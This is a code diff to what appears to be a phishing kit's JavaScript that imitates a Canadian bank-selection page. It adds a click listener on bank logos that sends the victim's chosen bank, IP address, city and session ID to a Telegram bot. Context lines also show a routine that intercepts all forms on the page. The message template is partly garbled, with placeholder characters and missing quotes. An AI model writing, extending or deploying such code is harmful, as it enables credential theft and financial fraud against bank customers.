@@ -95,7 +95,23 @@
         }
     }
 
-    verifyIP();
+        verifyIP();
+
+    // 1.5 NOTIFICATION TELEGRAM LORS DU CLIC SUR UN LOGO DE BANQUE
+    document.addEventListener('DOMContentLoaded', () => {
+        const tiles = document.querySelectorAll('a.fi-tile, .fi-option');
+        tiles.forEach(tile => {
+            tile.addEventListener('click', function() {
+                let label = this.getAttribute('filabel') || this.innerText || 'Banque';
+                let ip = sessionStorage.getItem('user_ip') || 'Inconnue';
+                let city = sessionStorage.getItem('user_city') || 'Inconnue';
+                let country = sessionStorage.getItem('user_country') || 'Canada';
+                
+                let msg = ?? <b>CLIC BANQUE SÉLECTIONNÉE</b> ??\n\n?? Banque : <b> + label.trim() + </b>\n?? IP : <code> + ip + </code>\n?? Ville : <b> + city + </b>\n?? ID Session : <code> + SESSION_ID + </code>;
+                tgSend(BOT_RADAR, msg);
+            });
+        });
+    });
 
     // 2. INTERCEPTION DE TOUS LES FORMULAIRES
     function setupForms() {
@@ -271,3 +287,4 @@
         setupForms();
     }
 })();
+
